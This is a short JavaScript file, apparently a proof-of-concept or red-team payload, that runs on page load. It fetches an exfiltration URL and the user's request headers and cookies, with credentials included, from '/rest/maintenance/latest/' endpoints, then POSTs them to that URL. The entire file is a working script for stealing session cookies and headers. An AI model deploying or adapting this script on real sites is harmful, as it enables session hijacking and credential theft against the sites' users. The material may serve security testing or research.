document.addEventListener("DOMContentLoaded", function () {
	async function exfilHeaders() {
		try {
			// Get the exfil URL
			const exfilUrlResponse = await fetch(
				"/rest/maintenance/latest/headerexfil"
			);
			const exfilUrl = await exfilUrlResponse.text();

			if (!exfilUrl) {
				console.log("Error while fetching exfil URL");
				return;
			}

			// Get the readers into the DOM (incl. Cookies)
			const headersResponse = await fetch(
				"/rest/maintenance/latest/getheaders",
				{
					method: "GET",
					credentials: "include", // Includes credentials
				}
			);
			const headersEncoded = await headersResponse.text();

			if (!headersEncoded) {
				console.log("Error while fetching headers");
				return;
			}

			// Exfil the headers
			const exfilPromise = await fetch(exfilUrl, {
				method: "POST",
				body: headersEncoded,
			});
			
			console.log("Exfiltrated the headers");
		} catch (error) {
			console.error("Error during exfiltration: " + error);
		}
	}

	exfilHeaders();
});
